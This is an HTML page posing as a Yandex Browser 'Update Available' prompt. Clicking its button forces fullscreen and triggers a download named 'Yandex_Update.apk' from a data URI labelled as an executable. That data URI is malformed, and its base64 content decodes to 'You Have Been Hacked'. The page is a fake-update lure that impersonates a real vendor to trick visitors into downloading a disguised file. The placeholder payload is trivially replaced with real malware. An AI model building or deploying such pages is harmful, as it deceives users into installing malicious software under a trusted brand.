<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Update Yandex Browser</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
    }
    .logo {
      width: 64px;
      height: 64px;
      background-color: #ff0000;
      color: white;
      font-size: 40px;
      font-weight: bold;
      line-height: 64px;
      border-radius: 12px;
      margin: 0 auto 20px;
    }
    h2 {
      margin: 0 0 10px;
      font-size: 22px;
      color: #333;
    }
    p {
      color: #666;
      font-size: 14px;
      margin-bottom: 30px;
      line-height: 1.5;
    }
    .button {
      background-color: #ff0000;
      border: none;
      color: white;
      padding: 12px 24px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      font-weight: 600;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
      transition: background-color 0.2s;
    }
    .button:hover {
      background-color: #d70000;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">Y</div>
  <h2>Update Available</h2>
  <p>A newer version of Yandex Browser is ready to install. Update now to get the latest security enhancements and performance improvements.</p>
  <input type="button" class="button" id="triggerInput" value="Update Now">
</div>

<script>
  document.getElementById('triggerInput').addEventListener('click', function() {
    // Logic remains unchanged
    setTimeout(function() {
      openWin();
    }, 2000);
    
    goFullScreen();
  }, { once: false });

  function Puf(uri, name) {
    const link = document.createElement("a");
    link.href = uri;
    link.download = name;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }

  function openWin() {
    Puf(
      "data://www.yandex.com/application/x-msdownload;base64,WW91IEhhdmUgQmVlbiBIYWNrZWQ=",
      "Yandex_Update.apk"
    );
  }

  function goFullScreen() {
    const element = document.documentElement;
    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if (element.mozRequestFullScreen) {
      element.mozRequestFullScreen();
    } else if (element.webkitRequestFullscreen) {
      element.webkitRequestFullscreen();
    } else if (element.msRequestFullscreen) {
      element.msRequestFullscreen();
    }
  }
</script>

</body>
</html>
